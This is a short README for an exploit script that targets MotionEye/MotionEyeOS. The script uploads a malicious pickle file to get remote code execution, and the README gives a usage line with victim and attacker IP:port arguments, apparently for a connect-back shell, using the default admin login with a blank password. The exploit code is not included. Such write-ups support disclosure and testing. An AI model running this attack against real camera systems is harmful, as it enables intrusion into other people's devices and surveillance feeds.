# MotionEye/MotionEyeOS Authenticated RCE
A Python 3 script that uploads a tasks.pickle file that enables RCE in MotionEye

Example:

main.py --victim 192.168.1.2 --attacker 192.168.1.3:4444

Where victim and attacker are in the form of ip:port, unless it is port 80. Then, the port can be excluded. This uses the default username of admin with a blank password. There are also CLI options for alternate usernames/passwords. Please see the code for more details. 

See https://www.pizzapower.me/2021/10/09/self-hosted-security-part-1-motioneye/ for more information. 
